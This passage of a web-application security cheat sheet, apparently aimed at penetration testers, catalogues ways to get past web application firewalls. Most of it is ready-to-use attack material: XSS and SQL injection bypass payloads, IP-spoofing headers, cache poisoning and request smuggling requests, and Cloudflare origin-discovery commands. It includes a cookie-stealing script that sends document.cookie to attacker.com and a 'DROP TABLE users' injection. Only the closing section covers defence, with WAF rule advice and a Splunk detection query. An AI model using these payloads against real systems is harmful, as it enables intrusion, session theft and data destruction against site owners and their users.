| **F5 BIG-IP** | `X-WA-Info`, `TS*` prefix cookies |
| **ModSecurity** | `Mod_Security`, `NOYB` headers, "Not Acceptable" response |
| **Imperva** | `X-Iinfo` header, `visid_incap_*` cookies |
| **Barracuda** | `barra_counter_session` cookie |

---

## 2. XSS WAF Filter Bypass Techniques — Complete Cheat Sheet

### Encoding Techniques

```html
<!-- Original payload -->
<script>alert(1)</script>

<!-- HTML Entity encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- URL encoding (Single) -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- URL encoding (Double) -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Unicode variation -->
<script>alert(1)</script>

<!-- Base64 + eval -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- JavaScript URI -->
javascript:alert(1)
javaSCRIPT:alert(1)
java&#x0A;script:alert(1)
```

### XSS Without script Tags (Event Handlers)

```html
<!-- Mouse/pointer events -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert`1`">
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<div onmouseover=alert(1)>XSS</div>

<!-- HTML5 new tags/events -->
<details open ontoggle=alert(1)>
<audio autoplay onerror=alert(1) src=x>
<video autoplay onerror=alert(1) src=x>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>XSS</marquee>
<meter onmouseover=alert(1)>XSS</meter>

<!-- CSS-based XSS -->
<link rel=stylesheet href=data:text/css,*{background:url('javascript:alert(1)')}>
<style>body{background:url('javascript:alert(1)')}</style>

<!-- Form action -->
<form action=javascript:alert(1)><input type=submit value=XSS>
<button formaction=javascript:alert(1)>XSS</button>
```

### WAF Bypass Character Manipulation

```html
<!-- Null byte insertion -->
<scri\0pt>alert(1)</scri\0pt>

<!-- Comment insertion -->
<scr<!--comment-->ipt>alert(1)</script>
<scr/**/ipt>alert(1)</script>

<!-- Tab/newline/whitespace -->
<img	src=x onerror=alert(1)>   (tab)
<img
src=x onerror=alert(1)>       (newline)

<!-- Mixed case -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- HTML5 auto-close -->
<svg><script>alert(1)</script>  (SVG context)

<!-- Attributes without quotes -->
<img src=x onerror=alert(1) />
```

### Polyglot XSS Payloads (Works in Multiple Contexts)

These payloads work across HTML, JavaScript, and URL contexts simultaneously, making them effective against WAFs that only check specific contexts.

---

## 3. SQL Injection WAF Bypass

```sql
-- Basic payload
' UNION SELECT 1,2,3--

-- Keyword splitting
' UN/**/ION SE/**/LECT 1,2,3--
' UNI%00ON SELECT 1,2,3--

-- Newline splitting
' UNION%0ASELECT 1,2,3--
' UNION%0D%0ASELECT 1,2,3--

-- Mixed case
' uNiOn SeLeCt 1,2,3--

-- Equivalent expression substitution
AND 1=1   →   AND 1 LIKE 1
AND 1=1   →   AND 1 BETWEEN 0 AND 2
OR        →   ||  (MySQL, SQLite)
UNION     →   UNION ALL

-- Whitespace substitute characters
TAB (%09), newline (%0A), form feed (%0C), carriage return (%0D)
/**/, /%%/, %20+%20, ()

-- MySQL version comment bypass
/*!UNION*/ /*!SELECT*/ 1,2,3
/*!50000UNION*/ SELECT 1,2,3  (executes on MySQL 5.0.00+)

-- HTTP Parameter Pollution (HPP)
?id=1&id=UNION&id=SELECT&id=1,2,3--
?id=1 UNION/*&id=*/SELECT 1,2,3--

-- JSON context
{"id": "1 UNION SELECT 1,2,3--"}
{"id": 1, "order": "ASC; DROP TABLE users--"}
```

---

## 4. HTTP-Level WAF Bypass Techniques

### Chunked Transfer Encoding

Splitting a payload into small chunks via chunked transfer encoding can prevent a WAF from reassembling the full payload, thus bypassing detection.

### HTTP Method Override

```http
POST /admin/delete HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
Content-Type: application/json

{"user_id": 123}
```

### Content-Type Manipulation

```http
# Change JSON to XML (confuse parsers)
POST /api/login HTTP/1.1
Content-Type: application/xml

<root><username>admin' OR '1'='1</username><password>x</password></root>
```

---

## 5. X-Forwarded-For Injection and IP Spoofing

### XFF Header Abuse

```http
-- IP whitelist bypass (admin panel access)
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
```

### SQL Injection via XFF

```http
-- When the server directly INSERTs the XFF header into a log DB
GET /api/resource HTTP/1.1
X-Forwarded-For: 192.168.1.1', (SELECT password FROM users WHERE id=1))--
```

### XSS via XFF (Log Viewer)

```http
-- When the admin log viewer renders XFF as HTML
GET / HTTP/1.1
X-Forwarded-For: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

---

## 6. Web Cache Poisoning

### Principle

```
Cache key = URL + Host + Accept-Encoding  (typically)
Excluded from cache key = X-Forwarded-Host, X-Forwarded-Scheme, etc.

Attack: abuse headers excluded from cache key to store malicious response in cache
→ All users who request the same URL receive the malicious cached response
```

### Vulnerable Headers

```http
-- Test: check if header value is reflected in the response
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: https
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### Cache Poisoning + DOM XSS

```
Step 1: Confirm X-Forwarded-Host is reflected in the response
Step 2: Verify <script src="//evil.com/script.js"> is reflected
Step 3: Repeat requests until the response is cached
Step 4: Regular users visit the same URL → cached XSS executes
```

### Web Cache Deception

```
Attacker → Sends victim a link: https://target.com/account/info.css
Victim clicks link → Receives authenticated account info page response
CDN misidentifies .css extension and stores in cache
Attacker → Accesses same URL → Obtains victim's account data
```

---

## 7. HTTP Request Smuggling Basics

### CL.TE (Content-Length + Transfer-Encoding Conflict)

```http
-- Front-end: processes Content-Length first
-- Back-end: processes Transfer-Encoding first

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL Attack

```http
-- Front-end: Transfer-Encoding first
-- Back-end: Content-Length first

POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

---

## 8. CDN/WAF Vendor-Specific Bypass Strategies

### Cloudflare — Direct Origin IP Access

```bash
# Find origin IP using Shodan
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str
shodan search "http.title:target.com" --fields ip_str

# Find using Censys
censys search "443.https.tls.certificate.parsed.names: target.com"

# Check historical DNS records via SecurityTrails
# → The IP before Cloudflare was enabled may still be the server IP

# Must set Host header for direct access
curl -H "Host: target.com" https://ORIGIN_IP/ --insecure
```

### AWS WAF JSON Injection Bypass

```http
-- AWS WAF parses JSON structure → inject within valid JSON
POST /api/search HTTP/1.1
Content-Type: application/json

{"q": {"$gt": ""}, "id": "1 UNION SELECT 1,2,3--"}

-- Base64 encoding bypass (when app decodes Base64 before processing)
{"query": "MScgVU5JT04gU0VMRUNUIDEsMiwzLS0="}
```

### ModSecurity OWASP CRS Bypass

```
Paranoia Level 1 (default): detects only basic attacks
Paranoia Level 4 (highest): very strict

PL1 bypass:
  → Simple encoding, case variation is sufficient

PL2 bypass:
  → Multi-layer encoding, chunked transfer

PL3/4 bypass:
  → Spread anomaly score (only partial payload per request)
  → Distribute payload across multiple parameters
```

---

## 9. Defense and Detection

### WAF Rule Writing Best Practices

```
Bad WAF rule (easy to bypass):
   block if request contains "script"
   → Bypassed with <SCRIPT>, <scr\nipt>, %3Cscript%3E, etc.

Good WAF rule (defense in depth):
   1. Normalize before checking: URL decode → HTML decode → Unicode normalize
   2. Context-aware: different filters per parameter type (numeric/string/HTML)
   3. Positive model: define only allowed patterns (allowlist over blocklist)
   4. Multi-layer detection: WAF + RASP + IDS combined
```

### ModSecurity + OWASP CRS Recommended Configuration

```apache
# modsecurity.conf
SecRuleEngine DetectionOnly  # Detection-only first → change to On after analysis
SecRequestBodyAccess On
SecResponseBodyAccess Off    # Performance optimization
SecAuditEngine RelevantOnly

# Paranoia Level 2 recommended (PL1 too lenient, PL3/4 too many false positives)
SecAction "id:900000,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=2"

# Anomaly score threshold
SecAction "id:900110,phase:1,nolog,pass,t:none,setvar:tx.inbound_anomaly_score_threshold=10"
```

### Detecting Bypass Attempts via Log Analysis

```spl
-- Splunk: WAF bypass pattern detection
index=web_logs status=200
| eval payload=urldecode(uri_query)
| rex field=payload "(?i)(?P<xss><[^>]+on\w+=|<script|javascript:)|(?P<sqli>union.{0,20}select|or.{0,10}1=1)"
| where isnotnull(xss) OR isnotnull(sqli)
| eval attack_type=if(isnotnull(xss), "XSS", "SQLi")
| stats count by src_ip, attack_type, uri_path
| where count > 5
```
